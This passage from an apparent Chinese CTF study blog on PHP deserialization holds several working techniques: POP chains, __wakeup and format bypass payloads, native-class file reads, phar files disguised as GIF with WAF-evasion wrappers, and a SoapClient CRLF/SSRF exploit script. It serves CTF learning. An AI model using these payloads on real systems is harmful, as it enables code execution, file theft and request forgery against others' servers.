属性会被序列化。serialize($myObject) 时，password 和 sessionData 属性不会被序列化，因为它们没有包含在 __sleep() 方法返回的数组中。</span><br><span class="hljs-variable">$serializedObject</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$myObject</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serializedObject</span>; <span class="hljs-comment">// 输出: O:7:&quot;MyClass&quot;:1:&#123;s:8:&quot;\0MyClass\0name&quot;;s:7:&quot;ChatGPT&quot;;&#125;</span><br><span class="hljs-comment">// 反序列化对象</span><br><span class="hljs-variable">$unserializedObject</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serializedObject</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="三种方法赋值"><a href="#三种方法赋值" class="headerlink" title="三种方法赋值"></a>三种方法赋值</h3><ol><li><p><strong>直接写只能写字符串：</strong></p><ul><li><code>private $username = &#39;xxxxxx&#39;;</code></li></ul></li><li><p><strong>外部写意图把类里的 <code>$a</code> 变量其他 <code>$b</code>，这样就写出了 pop，即：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SHOW;<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> CTF;<br><span class="hljs-variable">$s</span>-&gt;a = <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><ul><li>但是不能对私有属性进行赋值。</li></ul></li><li><p><strong>构造方法赋值：</strong></p><ul><li>以上缺点都没了：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = <span class="hljs-title">new</span> <span class="hljs-title">backdoor</span>();</span><br><span class="hljs-class">&#125;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><hr><h1 id="构造-pop-链"><a href="#构造-pop-链" class="headerlink" title="构造 pop 链"></a>构造 pop 链</h1><ul><li><strong>重点找起始和 RCE 终点，期间的变量赋值为变量时要外部赋值，普通变量就直接赋值。</strong></li><li><strong>链子：</strong>终点开始编写链子，期间用各种魔法方法到起点（利用 <code>new</code> 关键词开始 <code>construct</code>，<code>destruct</code>，<code>wakeup</code>），再把起点对象序列化。</li><li><strong>检查就是从后往前读了。</strong></li></ul><h1 id="序列化绕过"><a href="#序列化绕过" class="headerlink" title="序列化绕过"></a>序列化绕过</h1><ul><li><strong>绕过 <code>\0</code> 脚本或利用 PHP 7.1+ 的特性，直接用 <code>public</code> 生成字符串但容错机制。</strong></li><li><strong>指针引用：</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span>-&gt;a1 =&amp; <span class="hljs-variable">$b</span>-&gt;a2;<br><span class="hljs-variable">$a</span> = <span class="hljs-number">10</span>;<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b 是 $a 的引用</span><br><span class="hljs-variable">$b</span> = <span class="hljs-number">20</span>;  <span class="hljs-comment">// 改变 $b 也会改变 $a</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;  <span class="hljs-comment">// 输出 20</span><br></code></pre></td></tr></table></figure></li><li><strong>畸形字符串</strong> <ul><li><strong>绕过 <code>wakeup</code>。</strong></li></ul></li><li><strong>利用将属性值变大。</strong></li></ul><h1 id="使用-C-代替-O"><a href="#使用-C-代替-O" class="headerlink" title="使用 C 代替 O"></a>使用 C 代替 O</h1><h3 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h3><ul><li><code>5.3.0 - 5.3.29</code></li><li><code>5.4.0 - 5.4.45</code></li><li><code>5.5.0 - 5.5.38</code></li><li><code>5.6.0 - 5.6.40</code></li><li><code>7.0.0 - 7.0.33</code></li><li><code>7.1.0 - 7.1.33</code></li><li><code>7.2.0 - 7.2.34</code></li><li><code>7.3.0 - 7.3.28</code></li><li><code>7.4.0 - 7.4.16</code></li><li><code>8.0.0 - 8.0.3</code></li><li><strong>只能执行 <code>construct()</code> 函数，无法添加任何内容，然后析构函数最后执行。</strong></li></ul><h3 id="序列化机制构造一个对象，其中包含对象引用："><a href="#序列化机制构造一个对象，其中包含对象引用：" class="headerlink" title="序列化机制构造一个对象，其中包含对象引用："></a>序列化机制构造一个对象，其中包含对象引用：</h3><ul><li><code>7.0.0 - 7.0.14</code></li><li><code>7.1.0</code></li><li><code>5.4.14 - 5.4.45</code></li><li><code>5.5.0 - 5.5.38</code></li><li><code>5.6.0 - 5.6.29</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/iLSA7</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=73367</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Not a serializable object&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ryat == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&#x27;dtor!&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;O:3:&quot;obj&quot;:2:&#123;s:4:&quot;ryat&quot;;i:1;i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;&#125;&#x27;</span>;<span class="hljs-comment">//构造一个对象，其中 ryat 被设置为 1，然后让对象的另一个属性通过引用指向 ryat __wakeup() 修改了 ryat，但由于引用的存在，这个修改在某些地方不起作用，从而在 __destruct() 中成功触发了你原本不希望被触发的代码。</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br></code></pre></td></tr></table></figure></li><li><strong>多写一个 <code>i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;</code> 再改对象数仿照以上。</strong></li></ul><h3 id="利用-fastdestruct-机制让-destruct-跑到前面去："><a href="#利用-fastdestruct-机制让-destruct-跑到前面去：" class="headerlink" title="利用 fastdestruct 机制让 destruct 跑到前面去："></a>利用 <code>fastdestruct</code> 机制让 <code>destruct</code> 跑到前面去：</h3><ul><li><strong>一般删最后的 <code>&#125;</code> 就行。</strong></li></ul><h1 id="字符-O-绕过"><a href="#字符-O-绕过" class="headerlink" title="字符 O 绕过"></a>字符 O 绕过</h1><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ul><li><code>&lt;7.1.33</code></li></ul><h3 id="测试脚本："><a href="#测试脚本：" class="headerlink" title="测试脚本："></a>测试脚本：</h3><ul><li><a href="https://3v4l.org/YclXi">https://3v4l.org/YclXi</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YclXi</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:+1:&quot;C&quot;:0:&#123;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="字符-i、d-绕过"><a href="#字符-i、d-绕过" class="headerlink" title="字符 i、d 绕过"></a>字符 i、d 绕过</h1><h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h3><ul><li><code>&lt;8.0.3</code> （全版本）</li></ul><h3 id="测试脚本：-1"><a href="#测试脚本：-1" class="headerlink" title="测试脚本："></a>测试脚本：</h3><ul><li><a href="https://3v4l.org/SJm2g">https://3v4l.org/SJm2g</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="利用数组特性"><a href="#利用数组特性" class="headerlink" title="利用数组特性"></a>利用数组特性</h1><ul><li><p><strong>数组特性：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> A, <span class="hljs-string">&#x27;a的方法&#x27;</span>];<br><span class="hljs-variable">$arr</span>(); <span class="hljs-comment">// 会直接调用 a 方法</span><br></code></pre></td></tr></table></figure></li><li><p><strong>反序列化利用：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;key)();     <span class="hljs-comment">//</span><br><br>在这里运用数组特性<br>          <span class="hljs-variable language_">$this</span>-&gt;mod2 =<span class="hljs-string">&quot;welcome&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;modl;<br>      &#125;<br>    <span class="hljs-variable">$arr</span> = [<span class="hljs-variable">$gf</span>, <span class="hljs-string">&#x27;get flag&#x27;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> func;<br>    <span class="hljs-variable">$f</span>-&gt;key = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="利用原生类"><a href="#利用原生类" class="headerlink" title="利用原生类"></a>利用原生类</h1><h3 id="查看-flag-文件名："><a href="#查看-flag-文件名：" class="headerlink" title="查看 flag 文件名："></a>查看 flag 文件名：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;DirectoryIterator&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;glob:///f*&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">c</span>(<span class="hljs-variable">$this</span>-&gt;f);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FLAG&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读取文件："><a href="#读取文件：" class="headerlink" title="读取文件："></a>读取文件：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;SplFileObject&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;/flllaaaaggg&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">c</span>(<span class="hljs-variable">$this</span>-&gt;f);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FLAG&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="GMP"><a href="#GMP" class="headerlink" title="GMP"></a>GMP</h1><h1 id="Phar-八股文"><a href="#Phar-八股文" class="headerlink" title="Phar 八股文"></a>Phar 八股文</h1><ul><li><strong>这段代码展示了如何生成一个 <code>.phar</code> 文件，并将任意 PHP 代码作为 stub。当这个 <code>.phar</code> 文件被解析或执行时，代码中的 stub 会被执行。</strong></li><li><strong>如果 WAF 过滤了 <code>phar://</code>，则可以使用：</strong><ul><li><code>compress.bzip2://phar://</code></li><li><code>compress.zlib://</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);  <span class="hljs-comment">//echo ($o) 变为八股文 </span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;text&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//执行生成 phar.phar 文件</span><br>@<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;gzip phar.phar&quot;</span>);  <span class="hljs-comment">// 将 Phar 文件压缩为 gzip 格式</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;phar.phar.gz&quot;</span>));  <span class="hljs-comment">// 输出压缩后的 Phar 文件内容并进行 URL 编码，根据情况删掉后两行</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="伪造为-GIF-的-Phar"><a href="#伪造为-GIF-的-Phar" class="headerlink" title="伪造为 GIF 的 Phar"></a>伪造为 GIF 的 Phar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置 stub，增加 gif 文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义 meta-data 存入 manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="然后就是利用，可以利用的函数："><a href="#然后就是利用，可以利用的函数：" class="headerlink" title="然后就是利用，可以利用的函数："></a>然后就是利用，可以利用的函数：</h3><ul><li><code>file_get_contents</code></li><li><code>fileatime</code></li><li><code>filectime</code></li><li><code>file_ctime</code></li><li><code>is_dir</code></li><li><code>is_file</code></li><li><code>is_executable</code></li><li><code>copy</code></li><li><code>unlink</code></li><li><code>stat</code></li><li><code>readfile</code></li></ul><h3 id="利用-file-get-contents-可以访问自己网站上的-Phar："><a href="#利用-file-get-contents-可以访问自己网站上的-Phar：" class="headerlink" title="利用 file_get_contents 可以访问自己网站上的 Phar："></a>利用 <code>file_get_contents</code> 可以访问自己网站上的 Phar：</h3><ul><li><code>cd /var/www/html</code></li><li><code>sudo chown www-data:www-data /var/www/html -R</code></li><li><code>sudo nano writefile.php</code></li></ul><h3 id="或者得到的数据直接上传到任意路径中，再用-phar-xxxxx-传到-file-get-content"><a href="#或者得到的数据直接上传到任意路径中，再用-phar-xxxxx-传到-file-get-content" class="headerlink" title="或者得到的数据直接上传到任意路径中，再用 phar://xxxxx 传到 file_get_content"></a>或者得到的数据直接上传到任意路径中，再用 <code>phar://xxxxx</code> 传到 <code>file_get_content</code></h3><h3 id="利用-data-在-PHP-终端制造："><a href="#利用-data-在-PHP-终端制造：" class="headerlink" title="利用 data:// 在 PHP 终端制造："></a>利用 <code>data://</code> 在 PHP 终端制造：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ph</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$ph</span>);<br></code></pre></td></tr></table></figure><ul><li><strong>让 <code>file_get_contents</code> 包含 <code>&#123;data://text/plain;base64（写入终端结果）&#125;</code> 到 <code>xxx.html</code>（后缀不重要），最后让 <code>file_get_contents</code> 包含 <code>phar://xxx.html</code>。</strong></li></ul><hr><h1 id="总结一下利用-PHP-反序列化逃逸的步骤"><a href="#总结一下利用-PHP-反序列化逃逸的步骤" class="headerlink" title="总结一下利用 PHP 反序列化逃逸的步骤"></a>总结一下利用 PHP 反序列化逃逸的步骤</h1><ol><li>确定利用目标</li><li>按照原程序正常序列化的步骤做一遍，看看正常序列化字符串的结构，基于此考虑攻击方式。注意，键值对设置的顺序会影响序列化结果，一定要按照程序内的方式设置值。</li><li>计算逃逸总共需要的字符，考虑需要构建多少被替换的字符。</li><li>插入 payload，结合本地运行结果查看 payload 是否成功</li></ol><h3 id="PHP-反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。"><a href="#PHP-反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。" class="headerlink" title="PHP 反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。"></a>PHP 反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。</h3><hr><h1 id="CRLF-攻击"><a href="#CRLF-攻击" class="headerlink" title="CRLF 攻击"></a>CRLF 攻击</h1><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ul><li>源码需要进行反序列化</li><li>源码调用一个方法，且该方法不存在。以此激活 <code>__call()</code></li></ul><h3 id="利用范围（PHP-5-PHP-7）："><a href="#利用范围（PHP-5-PHP-7）：" class="headerlink" title="利用范围（PHP 5, PHP 7）："></a>利用范围（PHP 5, PHP 7）：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VulnerableClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userAgent</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$userAgent</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;userAgent = <span class="hljs-variable">$userAgent</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-comment">// 输出一条消息，模拟 __call 魔术方法被触发</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Method <span class="hljs-subst">$name</span> was called!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUserAgent</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;userAgent;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 模拟用户输入反序列化的操作</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">getUserAgent</span>();<br>    <span class="hljs-comment">// 调用一个不存在的方法，激活 __call 方法</span><br>    <span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aa</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aa</span>-&gt;<span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php反序列化</category>
      
    </categories>
    
    
    <tags>
      
